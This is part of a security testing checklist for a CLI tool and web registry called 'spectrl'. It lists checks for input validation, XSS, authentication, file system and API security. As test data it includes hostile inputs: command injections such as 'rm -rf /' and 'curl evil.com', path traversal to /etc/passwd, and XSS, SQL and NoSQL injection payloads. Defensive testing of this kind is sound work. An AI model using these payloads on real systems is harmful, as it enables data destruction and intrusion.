# Part 11: Security Testing

## 28. INPUT VALIDATION & SANITIZATION

### 28.1 Spec Name Validation

- [ ] Try spec name with spaces: `spectrl new "my spec"`
- [ ] Verify rejected with clear error
- [ ] Try uppercase: `spectrl new MySpec`
- [ ] Verify rejected or normalized
- [ ] Try special characters: `spectrl new my@spec!`
- [ ] Verify rejected
- [ ] Try path traversal: `spectrl new ../../../etc/passwd`
- [ ] Verify rejected
- [ ] Try very long name (>255 chars)
- [ ] Verify rejected or truncated
- [ ] Try empty name: `spectrl new ""`
- [ ] Verify rejected
- [ ] Try unicode/emoji: `spectrl new my-spec-🚀`
- [ ] Verify handled appropriately

### 28.2 Version Number Validation

- [ ] Try invalid version: `spectrl new test --version abc`
- [ ] Verify rejected
- [ ] Try version with spaces: `spectrl new test --version "1 .0. 0"`
- [ ] Verify rejected or sanitized
- [ ] Try negative version: `spectrl new test --version -1.0.0`
- [ ] Verify rejected
- [ ] Try very large version numbers
- [ ] Verify handled appropriately
- [ ] Try version with special chars: `spectrl new test --version 1.0.0; rm -rf /`
- [ ] Verify sanitized, no command execution

### 28.3 File Path Validation

- [ ] Create spectrl.json with file: `../../../etc/passwd`
- [ ] Try publish
- [ ] Verify rejected
- [ ] Create spectrl.json with absolute path: `/etc/passwd`
- [ ] Try publish
- [ ] Verify rejected
- [ ] Create spectrl.json with symlink to outside directory
- [ ] Try publish
- [ ] Verify rejected or symlink not followed
- [ ] Create spectrl.json with Windows path: `C:\Windows\System32\config\sam`
- [ ] Try publish
- [ ] Verify rejected

### 28.4 Command Injection Prevention

- [ ] Create spec name: `test; rm -rf /`
- [ ] Try publish
- [ ] Verify no command execution
- [ ] Verify name sanitized
- [ ] Create spec name: `test && curl evil.com`
- [ ] Try publish
- [ ] Verify no network request made
- [ ] Create spec name with backticks: `test\`whoami\``
- [ ] Try publish
- [ ] Verify no command execution
- [ ] Create spec name: `test$(whoami)`
- [ ] Try publish
- [ ] Verify no command execution

### 28.5 Description & Metadata Injection

- [ ] Create spec with description containing HTML: `<script>alert('xss')</script>`
- [ ] Publish and view on web
- [ ] Verify HTML escaped/sanitized
- [ ] Verify no script execution
- [ ] Create spec with description containing SQL: `'; DROP TABLE specs; --`
- [ ] Publish and search
- [ ] Verify no SQL injection
- [ ] Create spec with very long description (>10,000 chars)
- [ ] Verify handled appropriately
- [ ] Verify doesn't break UI

## 29. WEB APPLICATION SECURITY

### 29.1 XSS Prevention

- [ ] Publish spec with XSS in name: `<script>alert('xss')</script>`
- [ ] View spec detail page
- [ ] Verify script tag escaped
- [ ] Verify no alert shown
- [ ] Publish spec with XSS in description
- [ ] View on web
- [ ] Verify escaped in all locations
- [ ] Publish spec with XSS in tags: `<img src=x onerror=alert('xss')>`
- [ ] View on web
- [ ] Verify escaped
- [ ] Create file with XSS in content
- [ ] Publish and view file on web
- [ ] Verify markdown rendered safely
- [ ] Verify no script execution

### 29.2 CSRF Protection (if applicable)

- [ ] Check if API endpoints require CSRF tokens
- [ ] Try making API request without token
- [ ] Verify rejected
- [ ] Try making request with invalid token
- [ ] Verify rejected
- [ ] Check if state-changing operations protected

### 29.3 Authentication & Authorization

- [ ] Try accessing protected API endpoint without auth
- [ ] Verify 401 Unauthorized
- [ ] Try accessing someone else's spec for editing
- [ ] Verify 403 Forbidden
- [ ] Try unpublishing someone else's spec
- [ ] Verify rejected
- [ ] Try with expired token
- [ ] Verify rejected with clear error
- [ ] Try with malformed token
- [ ] Verify rejected

### 29.4 Rate Limiting

- [ ] Make many search requests rapidly (>100 in 1 minute)
- [ ] Verify rate limit applied
- [ ] Verify 429 Too Many Requests response
- [ ] Verify Retry-After header present
- [ ] Wait for rate limit to reset
- [ ] Verify can make requests again
- [ ] Try publishing many specs rapidly
- [ ] Verify rate limit applied
- [ ] Try installing many specs rapidly
- [ ] Verify handled appropriately

### 29.5 Content Security Policy

- [ ] Open web app
- [ ] Open browser DevTools Console
- [ ] Check for CSP errors
- [ ] Verify no CSP violations
- [ ] Verify inline scripts blocked (if CSP strict)
- [ ] Verify external scripts from allowed domains only
- [ ] Check CSP headers in Network tab
- [ ] Verify appropriate CSP policy set

### 29.6 HTTPS & Secure Connections

- [ ] Verify site uses HTTPS
- [ ] Verify certificate valid
- [ ] Try accessing via HTTP
- [ ] Verify redirects to HTTPS
- [ ] Check for mixed content warnings
- [ ] Verify all resources loaded over HTTPS
- [ ] Verify API calls use HTTPS
- [ ] Check HSTS header present

### 29.7 Sensitive Data Exposure

- [ ] Check if auth tokens visible in URLs
- [ ] Verify tokens not in query params
- [ ] Check browser DevTools Network tab
- [ ] Verify tokens not logged in responses
- [ ] Check localStorage/sessionStorage
- [ ] Verify sensitive data encrypted or not stored
- [ ] Check error messages
- [ ] Verify don't expose internal paths/stack traces
- [ ] Check API responses
- [ ] Verify don't expose unnecessary data

## 30. FILE SYSTEM SECURITY

### 30.1 Symlink Attacks

- [ ] Create malicious symlink pointing to /etc/passwd
- [ ] Try publishing spec with this symlink
- [ ] Verify rejected or symlink not followed
- [ ] Create symlink loop (A -> B -> A)
- [ ] Try publishing
- [ ] Verify detected and rejected
- [ ] Create symlink to parent directory
- [ ] Try publishing
- [ ] Verify rejected

### 30.2 Directory Traversal

- [ ] Try installing spec with path: `../../etc/passwd`
- [ ] Verify sanitized
- [ ] Verify installs to correct location
- [ ] Try creating spec with file path: `../../../etc/passwd`
- [ ] Verify rejected
- [ ] Check installed files
- [ ] Verify all within expected directory
- [ ] Verify no files outside `.spectrl/`

### 30.3 File Permissions

- [ ] Check permissions on installed files
- [ ] Verify not world-writable
- [ ] Verify appropriate permissions (644 for files, 755 for dirs)
- [ ] Check permissions on registry files
- [ ] Verify secure
- [ ] Check permissions on auth token file
- [ ] Verify only readable by owner (600)

### 30.4 Malicious File Content

- [ ] Create spec with very large file (>1GB)
- [ ] Try publishing
- [ ] Verify size limit enforced
- [ ] Create spec with binary executable
- [ ] Publish and install
- [ ] Verify executable bit not set
- [ ] Create spec with many files (>10,000)
- [ ] Try publishing
- [ ] Verify limit enforced or handles gracefully
- [ ] Create spec with deeply nested directories (>100 levels)
- [ ] Try publishing
- [ ] Verify handles appropriately

## 31. API SECURITY

### 31.1 Input Validation

- [ ] Send API request with invalid JSON
- [ ] Verify 400 Bad Request
- [ ] Send request with missing required fields
- [ ] Verify 400 with clear error
- [ ] Send request with wrong field types
- [ ] Verify 400 with validation error
- [ ] Send request with extra unknown fields
- [ ] Verify handled appropriately (ignored or rejected)

### 31.2 SQL Injection (if using SQL database)

- [ ] Search with SQL injection: `' OR '1'='1`
- [ ] Verify no SQL error
- [ ] Verify results normal
- [ ] Search with: `'; DROP TABLE specs; --`
- [ ] Verify no database modification
- [ ] Try in spec name, description, tags
- [ ] Verify all inputs sanitized

### 31.3 NoSQL Injection (if using NoSQL)

- [ ] Search with NoSQL injection: `{"$gt": ""}`
- [ ] Verify sanitized
- [ ] Try with: `{"$ne": null}`
- [ ] Verify no unintended results
- [ ] Verify all inputs validated

### 31.4 API Response Validation

- [ ] Check API responses for sensitive data
- [ ] Verify no internal IDs exposed unnecessarily
- [ ] Verify no stack traces in errors
- [ ] Verify no database queries in responses
- [ ] Verify appropriate error messages (not too revealing)

### 31.5 Request Size Limits

- [ ] Send very large request body (>10MB)
- [ ] Verify rejected
- [ ] Verify 413 Payload Too Large
- [ ] Send request with very long URL (>2000 chars)
- [ ] Verify handled appropriately
- [ ] Send many headers
- [ ] Verify limit enforced
